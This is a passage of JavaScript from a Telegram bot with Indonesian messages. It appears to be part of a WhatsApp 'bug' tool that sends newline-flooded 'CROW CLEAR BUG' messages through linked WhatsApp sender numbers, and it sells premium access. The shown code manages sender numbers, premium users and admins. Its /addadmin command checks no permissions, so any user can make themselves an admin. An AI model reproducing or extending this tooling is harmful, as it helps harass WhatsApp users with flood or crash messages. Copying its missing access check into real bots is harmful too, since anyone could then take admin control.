                text: "CROW CLEAR BUG \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCROW CLEAR BUG"
            });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Azz!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
//=======plugins=======//
bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "âš ï¸ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "âŒ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "âŒ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "âŒ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "âŒ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "âŒ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `âœ… User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `âœ… User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "âŒ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "ğŸ“Œ No premium users found.");
  }

  let message = "```ï¼¬ï¼©ï¼³ï¼´ ï¼°ï¼²ï¼¥ï¼­ï¼©ï¼µï¼­\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "âŒ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "âŒ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `âœ… User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `âŒ User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "âŒ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "âŒ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "âŒ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `âŒ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `âœ… User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "âš ï¸ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "âŒ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "âŒ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `âœ… User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `âŒ User ${userId} is not an admin.`);
    }
});